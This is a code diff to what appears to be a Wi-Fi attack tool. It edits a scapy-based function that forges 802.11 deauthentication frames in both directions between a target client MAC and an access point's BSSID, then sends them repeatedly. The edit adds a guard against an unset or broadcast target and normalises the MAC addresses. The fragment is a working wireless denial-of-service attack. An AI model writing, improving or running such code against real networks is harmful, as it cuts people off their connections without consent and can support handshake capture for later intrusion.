@@ -94,12 +94,16 @@ def deauth(interface, reason, count, behavior):
     print(interface, reason, count, behavior)
 
     def shoot(behavior, count):
+        if mac.mac == "FF:FF:FF:FF:FF:FF" or mac.mac == "":
+            return "No target set, not shooting"
+        target_mac = mac.mac.lower()
+        bssid = mac.bssid.lower()
         dot11_bssid = scapy.layers.dot11.Dot11(
             type=0,
             subtype=12,
-            addr1=mac.mac,
-            addr2=mac.bssid,
-            addr3=mac.bssid,
+            addr1=target_mac,
+            addr2=bssid,
+            addr3=bssid,
         )
         deauth_frame = scapy.layers.dot11.Dot11Deauth(reason=reason)
         frame_bssid = scapy.layers.dot11.RadioTap() / dot11_bssid / deauth_frame
@@ -108,16 +112,15 @@ def deauth(interface, reason, count, behavior):
         dot11_client = scapy.layers.dot11.Dot11(
             type=0,
             subtype=12,
-            addr1=mac.bssid,
-            addr2=mac.mac,
-            addr3=mac.bssid
+            addr1=bssid,
+            addr2=target_mac,
+            addr3=bssid
         )
         frame_client = scapy.layers.dot11.RadioTap() / dot11_client / deauth_frame
         for num in range(0, count):
             sendp(frame_bssid, iface=interface, count=1)
             if behavior:
                 sendp(frame_client, iface=interface, count=1)
-
     shoot(behavior=behavior, count=count)
     return f"{count} deauths sent to {mac.mac} from {mac.bssid}"
 
